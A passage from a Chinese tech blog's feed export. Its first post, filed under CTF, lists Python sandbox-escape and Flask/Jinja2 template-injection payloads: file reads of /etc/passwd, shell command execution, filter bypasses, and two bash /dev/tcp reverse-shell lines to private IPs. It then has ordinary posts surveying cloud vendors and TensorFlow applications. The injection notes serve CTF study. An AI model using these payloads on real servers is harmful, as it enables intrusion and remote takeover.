class="line">        <span class="keyword">exec</span> <span class="string">'x='</span>+x[:<span class="number">50</span>] <span class="keyword">in</span> d</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, d[<span class="string">'x'</span>]</span><br><span class="line">    <span class="keyword">except</span> _EOFError, e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line">    <span class="keyword">except</span> _BaseException, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h2 id="Flask-Jinja2模板注入"><a href="#Flask-Jinja2模板注入" class="headerlink" title="Flask/Jinja2模板注入"></a>Flask/Jinja2模板注入</h2><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10/&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1+2&#125;&#125;</span><br><span class="line">http://192.168.1.10/?name=&#123;&#123;1^0&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取一些内置的变量信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Flask模版中的一个全局对象，包含了应用程序的配置值</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"># 与服务器环境相关的对象字典</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>Python2.7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读文件</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'1.txt'</span>).read()</span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'2.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'Write it!'</span>)</span><br><span class="line"><span class="comment"># 读文件，base64编码</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'1.txt'</span>).read().encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="comment"># 通过 subprocess.Popen 执行 shell 命令</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'__class__'</span>][<span class="string">'__mro__'</span>].__getitem__(<span class="number">2</span>)[<span class="string">'__subclasses__'</span>]()[<span class="number">230</span>]([<span class="string">'ls'</span>, <span class="string">'-al'</span>, <span class="string">'/home'</span>],stdout=<span class="number">-1</span>)[<span class="string">'communicate'</span>]()</span><br><span class="line"><span class="comment"># 通过 os.popen 执行 shell 命令</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.popen(<span class="string">'id'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># eval python code __import__("sys").version</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">95</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">95</span>, <span class="number">40</span>, <span class="number">34</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">46</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>]).__str__()</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">'os.system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1"'</span>)</span><br></pre></td></tr></table></figure><p>Python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读写文件</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到eval函数</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># 读写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"open('/etc/passwd').read()"</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'open'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="comment"># 得到system，system执行命令不会有回显</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'cat /etc/passwd'</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'subprocess'</span>).Popen([<span class="string">'cat'</span>, <span class="string">'/etc/passwd'</span>]).read()</span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.85.146/4545 0&gt;&amp;1"'</span>)</span><br></pre></td></tr></table></figure><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;(&apos;&apos;|attr(&apos;__class__&apos;)&#125;&#125;，&#123;(&apos;&apos;[&apos;__class__&apos;])&#125;&#125;</span><br><span class="line"># 等价于</span><br><span class="line">&#123;&#123;&apos;&apos;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>空格可以用tab(%09)绕过</li><li>| 后不允许接a-z可以用%0c，tab等绕过</li><li>os可以通过python中exec绕过</li></ul><p>如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过</p><p>当要调用对象的方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir([]).__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; dir([])[&apos;__class__&apos;]</span><br></pre></td></tr></table></figure><p>但是flask和django的模板注入还有一种内置方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.__class__ 效果等于 request|attr(&apos;__class__&apos;)</span><br></pre></td></tr></table></figure><p>通过参数引入字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;&#123;request.args.class.join((request.args.usc*2,request.args.usc*2))&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure><p>通过设定变量提前创建好变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?secret=&#123;%set%09class=request.args.class.join((request.args.usc*2,request.args.usc*2))%&#125;&#123;&#123;class&#125;&#125;&amp;usc=_&amp;class=class</span><br></pre></td></tr></table></figure><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>利用字符串 format 的漏洞，如果格式化字符串的内容可以被控制，就能输出一些敏感信息，但是无法执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"><span class="comment"># a == joe</span></span><br><span class="line">input_t = <span class="string">'&#123;0.name&#125;'</span></span><br><span class="line">a = input_t.format(User(<span class="string">'joe'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># a == joe</span></span><br><span class="line">input_t = <span class="string">'&#123;user.name&#125;'</span></span><br><span class="line">a = input_t.format(user=User(<span class="string">'joe'</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;执行命令的函数&quot;&gt;&lt;a href=&quot;#执行命令的函数&quot; class=&quot;headerlink&quot; title=&quot;执行命令的函数&quot;&gt;&lt;/a&gt;执行命令的函数&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="Python" scheme="http://www.restran.net/tags/Python/"/>
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>云计算产品调研</title>
    <link href="http://www.restran.net/2018/05/16/cloud-computing-survey/"/>
    <id>http://www.restran.net/2018/05/16/cloud-computing-survey/</id>
    <published>2018-05-15T16:00:00.000Z</published>
    <updated>2018-05-16T09:47:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/post_img/2018/05/cloud-computing.jpg" alt="cloud-computing.jpg"></p><h2 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h2><p>目前主流云计算服务厂商，都从单纯的提供云主机等产品，扩展到提供行业的解决方案，建立起一站式的解决方案服务。</p><h3 id="云计算产品"><a href="#云计算产品" class="headerlink" title="云计算产品"></a>云计算产品</h3><ul><li>计算能力，云主机、GPU主机、物理服务器</li><li>数据库，MySQL、SQL Server、MongoDB</li><li>缓存，Redis、Memcached</li><li>云安全，DDoS防护</li><li>网络，负载均衡、NAT网关、私有网络</li><li>存储与分发，云硬盘、对象存储、消息队列、CDN、海外加速</li><li>大数据能力，流计算、数据计算服务</li><li>人工智能，深度学习平台、图像识别、语音识别、自然语言处理</li><li>域名服务，域名注册、域名备案</li><li>运维管理，云监控、云拨测</li><li>视频服务，直播、点播</li><li>容器云</li><li>实时数据库</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li>通用解决方案，网站</li><li>行业解决方案，零售、制造、游戏、金融、政务</li><li>大数据解决方案，智能配送、智能旅游、路况预测</li><li>区块链解决方案</li></ul><h2 id="云计算厂商"><a href="#云计算厂商" class="headerlink" title="云计算厂商"></a>云计算厂商</h2><p>仅列举了一些云计算厂商。</p><h3 id="国内云厂商"><a href="#国内云厂商" class="headerlink" title="国内云厂商"></a>国内云厂商</h3><ul><li><a href="https://www.aliyun.com/" target="_blank" rel="noopener">阿里云</a></li><li><a href="https://cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a></li><li><a href="https://www.mtyun.com" target="_blank" rel="noopener">美团云</a></li><li><a href="https://www.jdcloud.com" target="_blank" rel="noopener">京东云</a></li><li><a href="https://www.huaweicloud.com/" target="_blank" rel="noopener">华为云</a></li><li><a href="https://www.qingcloud.com" target="_blank" rel="noopener">青云</a></li></ul><p>专注某一领域的云产品</p><ul><li><a href="http://www.daocloud.io" target="_blank" rel="noopener">DaoCloud</a>，容器云</li><li><a href="https://www.qiniu.com/" target="_blank" rel="noopener">七牛</a>，云存储、直播</li><li><a href="https://www.upyun.com/" target="_blank" rel="noopener">又拍云</a>，云存储、CDN、直播</li></ul><h3 id="国外云厂商"><a href="#国外云厂商" class="headerlink" title="国外云厂商"></a>国外云厂商</h3><ul><li><a href="https://aws.amazon.com/cn/" target="_blank" rel="noopener">Amazon Web Services</a></li><li><a href="https://azure.microsoft.com/" target="_blank" rel="noopener">Azure</a></li><li><a href="https://cloud.google.com/" target="_blank" rel="noopener">Google Cloud Computing</a></li></ul><h2 id="一些新产品和架构"><a href="#一些新产品和架构" class="headerlink" title="一些新产品和架构"></a>一些新产品和架构</h2><h3 id="Serverless"><a href="#Serverless" class="headerlink" title="Serverless"></a>Serverless</h3><p>Serverless（无服务器）架构，如同许多新的概念一样，目前还没有一个普遍公认的权威的定义。最新的一个定义是这样描述的：“无服务器架构是基于互联网的系统，其中应用开发不使用常规的服务进程。相反，它们仅依赖于第三方服务（例如AWS Lambda服务），客户端逻辑和服务托管远程过程调用的组合。”</p><p>这项技术的目标并不是为了实现真正意义上的“无服务器”，而是指由第三方云计算供应商负责后端基础结构的维护，以服务的方式为开发者提供所需功能，例如数据库、消息，以及身份验证等。</p><h3 id="AWS-Lambda"><a href="#AWS-Lambda" class="headerlink" title="AWS Lambda"></a>AWS Lambda</h3><p>AWS Lambda 是一项计算服务，可以无需预配置或管理服务器即可运行代码。AWS Lambda 支持使用 Node.js、Java、C#、Go 和 Python 编写一段代码，通过 REST API 方式调用执行这段代码。</p><h3 id="Google-Cloud-Functions-BETA"><a href="#Google-Cloud-Functions-BETA" class="headerlink" title="Google Cloud Functions (BETA)"></a>Google Cloud Functions (BETA)</h3><p>事件驱动型无服务器计算平台，与 AWS Lambda 类似的产品。</p><h3 id="Baas-产品"><a href="#Baas-产品" class="headerlink" title="Baas 产品"></a>Baas 产品</h3><p>BaaS（Backend as a Service）是一种新型的云服务，旨在为移动和Web应用提供后端云服务，包括云端数据/文件存储、账户管理、消息推送、社交媒体整合等。BaaS是垂直领域的云服务，随着移动互联网的持续火热，BaaS也受到越来越多的开发者的亲睐。它作为应用开发的新模型，可以降低开发者成本，让开发者只需专注于具体的开发工作。</p><p>虽然BaaS属于PaaS的范畴，但两者也有区别。在BaaS平台中，开发者只需要定义数据模型，平台就会自动生成对应的接口，这可以让开发者更加专注具体的客户端代码。</p><ul><li><a href="https://firebase.google.com" target="_blank" rel="noopener">Google Firebase</a></li><li><a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a></li><li><a href="https://www.wilddog.com/" target="_blank" rel="noopener">野狗</a></li></ul><h3 id="Kubernetes-Engine"><a href="#Kubernetes-Engine" class="headerlink" title="Kubernetes Engine"></a>Kubernetes Engine</h3><p>Kubernetes Engine 是一个可用于部署容器化应用的托管式环境。它融合了提高开发效率、有效利用资源、自动化运维和开源灵活性方面的最新创新成果，能够加速进入市场以及迭代的时间。</p><h3 id="人工智能服务"><a href="#人工智能服务" class="headerlink" title="人工智能服务"></a>人工智能服务</h3><p>大多数的云厂商都提供了人工智能服务，提供了自然语言处理、图像识别、语音识别等API。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="http://www.infoq.com/cn/articles/the-definition-development-and-future-of-baas-services" target="_blank" rel="noopener">http://www.infoq.com/cn/articles/the-definition-development-and-future-of-baas-services</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/uploads/post_img/2018/05/cloud-computing.jpg&quot; alt=&quot;cloud-computing.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;云计算&quot;&gt;&lt;a href=&quot;#云计算&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="技术" scheme="http://www.restran.net/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="云计算" scheme="http://www.restran.net/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>深度学习和 TensorFlow 的有趣应用</title>
    <link href="http://www.restran.net/2018/05/10/tensorflow-applications/"/>
    <id>http://www.restran.net/2018/05/10/tensorflow-applications/</id>
    <published>2018-05-09T16:00:00.000Z</published>
    <updated>2018-05-11T10:01:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>TensorFlow 是 Google 开源的深度学习的软件库，可用于各种感知和语言理解任务的机器学习，可应用到客服、广告等领域。TensorFlow 一直以来的一个目标就是帮助尽量多的开发者把深度学习的技术利用起来，最终使得更多的用户从中受益。TensorFlow 支持多种软硬件环境，开发者可以在 Python、C++、Java、Go、C# 等很多开发环境中使用。Google 在 2017年推出了 TensorFlow Lite，它是专门针对移动和嵌入式应用场景打造的机器学习软件库，支持 iOS 和 Android。</p><p><img src="/uploads/post_img/2018/05/tensorflow.png" alt="tensorflow.png"></p><p>一些资料合集</p><ul><li><a href="https://github.com/jtoy/awesome-tensorflow" target="_blank" rel="noopener">awesome-tensorflow</a></li></ul><h2 id="图像和视频处理"><a href="#图像和视频处理" class="headerlink" title="图像和视频处理"></a>图像和视频处理</h2><h3 id="照片艺术风格化"><a href="#照片艺术风格化" class="headerlink" title="照片艺术风格化"></a>照片艺术风格化</h3><p>神经风格是将一张照片的风格迁移到另一张照片上的过程，同时保留相关的特张，通过这个项目，可以使用 TensorFlow 创建自己的 Prisma 应用程序。</p><p><img src="/uploads/post_img/2018/05/img-4.jpg" alt="img-4.jpg"></p><ul><li><a href="https://github.com/anishathalye/neural-style" target="_blank" rel="noopener">neural-style</a></li><li><a href="https://github.com/pavelgonchar/color-independent-style-transfer" target="_blank" rel="noopener">color-independent-style-transfer</a>，<a href="https://zhuanlan.zhihu.com/p/21836208" target="_blank" rel="noopener">中文介绍</a></li></ul><h3 id="图像创作"><a href="#图像创作" class="headerlink" title="图像创作"></a>图像创作</h3><p>素描图片自动上色</p><p><img src="/uploads/post_img/2018/05/img-5.jpg" alt="img-5.jpg"></p><p>二次元妹子头像生成</p><p><img src="/uploads/post_img/2018/05/img-7.jpg" alt="img-7.jpg"></p><ul><li><a href="https://github.com/pfnet/PaintsChainer" target="_blank" rel="noopener">素描图片自动上色</a>，<a href="http://paintschainer.preferred.tech/" target="_blank" rel="noopener">在线演示地址</a></li><li><a href="https://github.com/awentzonline/image-analogies" target="_blank" rel="noopener">使用神经匹配和融合生成相似图像</a></li><li><a href="https://github.com/pavelgonchar/colornet" target="_blank" rel="noopener">灰度图上色</a></li><li><a href="https://github.com/jayleicn/animeGAN" target="_blank" rel="noopener">二次元妹子头像生成</a></li><li><a href="https://www.autodraw.com/" target="_blank" rel="noopener">autodraw</a>，手绘草图，搜索对应的简笔画</li><li><a href="https://affinelayer.com/pixsrv/index.html" target="_blank" rel="noopener">image2image</a></li></ul><h3 id="图像分类-物体识别"><a href="#图像分类-物体识别" class="headerlink" title="图像分类/物体识别"></a>图像分类/物体识别</h3><p>识别上传地图片里边包含哪些物体，比如说我们在这个图片里边能够识别出这个是沙发、另外一个是人，等等这一系列的一些物体识别。以及在医学上的应用，如皮肤癌图像分类，通过手机拍照，做早期皮肤癌的检测，相关成果发表在 Nature 上。</p><p><img src="/uploads/post_img/2018/05/img-1.gif" alt="img-1.gif"></p><p><img src="/uploads/post_img/2018/05/img-2.jpg" alt="img-2.jpg"></p><ul><li><a href="https://github.com/akshaypai/tfClassifier" target="_blank" rel="noopener">tfClassifier</a></li><li><a href="http://www.infoq.com/cn/articles/application-of-tensorflow-in-intelligent-terminal" target="_blank" rel="noopener">看花识名</a></li></ul><h3 id="背景虚化处理"><a href="#背景虚化处理" class="headerlink" title="背景虚化处理"></a>背景虚化处理</h3><p>Android 手机相机最近有个自拍功能可以通过应用深度视觉模型非常准确地分离出前景和背景，然后就可以分别处理。而传统的办法是在手机上装两个摄像头，相对而言，利用深度学习算法既降低了手机的造价，又可以让现有的手机增加功能。</p><h3 id="图像描述"><a href="#图像描述" class="headerlink" title="图像描述"></a>图像描述</h3><p>识别图片内容，并用文字描述图片中的内容。还有的是根据图片内容，自动写一个故事。</p><ul><li><a href="https://github.com/iFighting/models/tree/master/im2txt" target="_blank" rel="noopener">im2txt</a>，图像描述</li><li><a href="https://github.com/ryankiros/neural-storyteller" target="_blank" rel="noopener">neural-storyteller</a>，根据图片内容自动写一个故事</li><li>微信小程序-智能识图</li></ul><h3 id="图片放大"><a href="#图片放大" class="headerlink" title="图片放大"></a>图片放大</h3><p>将模糊图片放大成高清图片。</p><p><img src="/uploads/post_img/2018/05/img-3.jpg" alt="img-3.jpg"></p><ul><li><a href="https://bigjpg.com/" target="_blank" rel="noopener">bigjpg</a>，这个项目是基于 <a href="https://github.com/nagadomi/waifu2x" target="_blank" rel="noopener">waifu2x</a> 和 <a href="https://github.com/torch/torch7" target="_blank" rel="noopener">torch</a></li></ul><h3 id="人体行为识别"><a href="#人体行为识别" class="headerlink" title="人体行为识别"></a>人体行为识别</h3><ul><li><a href="https://github.com/guillaume-chevalier/LSTM-Human-Activity-Recognition/" target="_blank" rel="noopener">LSTM-Human-Activity-Recognition</a></li></ul><h3 id="人脸识别"><a href="#人脸识别" class="headerlink" title="人脸识别"></a>人脸识别</h3><ul><li><a href="https://github.com/cmusatyalab/openface" target="_blank" rel="noopener">openface</a></li><li><a href="https://github.com/deepinsight/insightface" target="_blank" rel="noopener">insightface</a></li></ul><h3 id="换脸"><a href="#换脸" class="headerlink" title="换脸"></a>换脸</h3><p>自动替换图片和视频中人物的脸为其他人。</p><p><img src="/uploads/post_img/2018/05/img-6.png" alt="img-6.png"></p><ul><li><a href="https://github.com/deepfakes/faceswap" target="_blank" rel="noopener">faceswap</a></li><li><a href="https://hackernoon.com/exploring-deepfakes-20c9947c22d9" target="_blank" rel="noopener">exploring-deepfakes</a></li></ul><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><p>识别图片中的文字</p><ul><li><a href="https://zhuanlan.zhihu.com/p/24698483" target="_blank" rel="noopener">TensorFlow与中文手写汉字识别</a></li><li><a href="https://zhuanlan.zhihu.com/p/33127851" target="_blank" rel="noopener">自然场景中文文字检测和不定长中文OCR识别</a></li></ul><h2 id="自然语言处理"><a href="#自然语言处理" class="headerlink" title="自然语言处理"></a>自然语言处理</h2><p>可以用于智能问答、聊天机器人、智能客服、智能评卷、自动阅卷评分、句子分类和情绪分析等。</p><ul><li><a href="https://github.com/dennybritz/cnn-text-classification-tf" target="_blank" rel="noopener">句子分类 cnn-text-classification-tf</a></li><li><a href="https://github.com/jinfagang/tensorflow_poems" target="_blank" rel="noopener">中文古诗自动作诗机器人</a></li></ul><h2 id="音频处理"><a href="#音频处理" class="headerlink" title="音频处理"></a>音频处理</h2><ul><li><a href="https://github.com/ibab/tensorflow-wavenet" target="_blank" rel="noopener">语音合成</a></li><li><a href="https://github.com/tensorflow/magenta" target="_blank" rel="noopener">音乐创作</a></li><li><a href="https://github.com/keithito/tacotron" target="_blank" rel="noopener">Tacotron语音合成</a></li><li><a href="https://github.com/mozilla/DeepSpeech" target="_blank" rel="noopener">语音转文字</a></li></ul><h2 id="训练机器玩游戏"><a href="#训练机器玩游戏" class="headerlink" title="训练机器玩游戏"></a>训练机器玩游戏</h2><ul><li><a href="https://github.com/kevinhughes27/TensorKart" target="_blank" rel="noopener">TensorKart</a></li><li><a href="https://github.com/yenchenlin/DeepLearningFlappyBird" target="_blank" rel="noopener">FlappyBird</a></li><li><a href="https://github.com/Rochester-NRT/RocAlphaGo" target="_blank" rel="noopener">用深度神经网络和树搜索学习围棋</a></li></ul><h2 id="推荐系统"><a href="#推荐系统" class="headerlink" title="推荐系统"></a>推荐系统</h2><p>推荐系统在很多地方都会用，在推荐领域，已经有很多存在的并且被广泛应用的方法，比如协同过滤。现在可以使用深度神经网络让推荐的效果变得更好。</p><ul><li><a href="https://github.com/songgc/TF-recomm" target="_blank" rel="noopener">TF-recomm</a></li><li><a href="https://zhuanlan.zhihu.com/p/22597010" target="_blank" rel="noopener">深度学习在推荐系统中的一些应用</a></li><li><a href="https://yq.aliyun.com/articles/154475" target="_blank" rel="noopener">使用深度学习Keras和TensorFlow打造一款音乐推荐系统</a></li><li><a href="https://tech.meituan.com/dl.html" target="_blank" rel="noopener">深度学习在美团点评推荐平台排序中的运用</a></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><a href="https://github.com/RyanZotti/Self-Driving-Car" target="_blank" rel="noopener">树莓派搭建的自动驾驶玩具车</a></li></ul><p><img src="/uploads/post_img/2018/05/self-driving-car-toy.jpg" alt="self-driving-car.jpg"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://www.leiphone.com/news/201704/82OUlsEhA3K3di8Y.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201704/82OUlsEhA3K3di8Y.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TensorFlow 是 Google 开源的深度学习的软件库，可用于各种感知和语言理解任务的机器学习，可应用到客服、广告等领域。TensorFlow 一直以来的一个目标就是帮助尽量多的开发者把深度学习的技术利用起来，最终使得更多的用户从中受益。TensorFlow 支持多
      
    
    </summary>
    
      <category term="TensorFlow" scheme="http://www.restran.net/categories/TensorFlow/"/>
    
    
      <category term="TensorFlow" scheme="http://www.restran.net/tags/TensorFlow/"/>
    
      <category term="AI" scheme="http://www.restran.net/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>如何修改迅雷的下载地址</title>
    <link href="http://www.restran.net/2017/12/21/xunlei-download-modify-url/"/>
    <id>http://www.restran.net/2017/12/21/xunlei-download-modify-url/</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2017-12-28T08:41:41.000Z</updated>
    
